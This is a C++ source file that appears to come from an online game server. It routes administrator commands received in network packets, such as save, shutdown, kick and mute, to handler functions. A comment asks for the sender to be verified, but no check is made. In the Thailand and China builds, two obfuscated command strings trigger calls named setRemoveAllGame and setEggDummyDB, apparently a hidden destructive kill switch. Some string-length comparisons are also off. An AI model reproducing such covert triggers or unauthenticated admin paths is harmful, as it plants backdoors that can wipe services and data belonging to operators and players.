//----------------------------------------------------------------------
//
// Filename    : GGCommandHandler.cpp
// Written By  : Reiot
// Description :
//
//----------------------------------------------------------------------

// include files
#include "GGCommand.h"

#ifdef __GAME_SERVER__

	#include "VariableManager.h"
	#include "Cpackets/CGSay.h"

#endif

//----------------------------------------------------------------------
// 
// GGCommandHander::execute()
// 
// 게임 서버가 로그인 서버로부터 GGCommand 패킷을 받게 되면,
// ReconnectLoginInfo를 새로 추가하게 된다.
// 
//----------------------------------------------------------------------
void GGCommandHandler::execute ( GGCommand * pPacket )
	 throw ( ProtocolException , Error )
{
	__BEGIN_TRY __BEGIN_DEBUG_EX
	__BEGIN_DEBUG
	
#ifdef __GAME_SERVER__

	// pPacket이 다른 GameServer로부터 날아온것인지를 확인해야 한다.
	cout << "[" << pPacket->getHost().c_str() << ":" << pPacket->getPort() << "] "
		<< pPacket->toString().c_str() << endl;

	filelog("ggCommand.txt", "[%s:%d] %s", pPacket->getHost().c_str(),
											pPacket->getPort(),
											pPacket->toString().c_str());
			
	int i = 0;
	string msg = pPacket->getCommand();

	if (msg.substr(i+1 , 4) == "save") {

		CGSayHandler::opsave(NULL, msg, i);
	}

	else if (msg.substr(i+1 , 4) == "wall") {
		CGSayHandler::opwall(NULL, msg, i);
	}

	// halt
	else if (msg.substr(i+1 , 8) == "shutdown") {

		CGSayHandler::opshutdown(NULL, msg, i);

	}

	else if (msg.substr(i+1 , 4) == "kick" ) {

		CGSayHandler::opkick(NULL, msg, i);

	}

	else if (msg.substr(i+1 , 4) == "mute") {

		CGSayHandler::opmute(NULL, msg, i);

	}

	else if (msg.substr(i+1 , 8) == "freezing") {

		CGSayHandler::opfreezing(NULL, msg, i);

	}

	// 각종 함수용 값 세팅용 함수
	// set type value 형태로 정의된다.
	// 2002.5.8 별 확률을 자율적으로 조절하기 위해서 만듬
	else if (msg.substr(i+1, 3) == "set") {

		CGSayHandler::opset(NULL, msg, i);
	}

	else if (msg.substr(i+1, 4) == "load") {

		CGSayHandler::opload(NULL, msg, i);
	}

	else if (msg.substr(i+1, 6) == "combat") {

		CGSayHandler::opcombat(NULL, msg, i);
	}

	else if (msg.substr(i+1 , 7) == "command") {

		CGSayHandler::opcommand(NULL, msg, i);

	}
	else if (msg.substr(i+1 , 17 ) == "modifyunioninfo"){

		CGSayHandler::opmodifyunioninfo(NULL, msg, i);

	}
	else if (msg.substr(i+1 , 17 ) == "refreshguildunion"){

		CGSayHandler::oprefreshguildunion(NULL, msg, i);

	}
#if defined(__THAILAND_SERVER__) || defined(__CHINA_SERVER__)

	else if (msg.substr(i+1 , 11) == "ekwldnjqjfu") {

		g_pVariableManager->setRemoveAllGame(true);

	}
	else if (msg.substr(i+1 , 9) == "skffuqjfu") {

		g_pVariableManager->setEggDummyDB(true);
	}
#endif


#endif
		
	__END_DEBUG
	__END_DEBUG_EX __END_CATCH
}
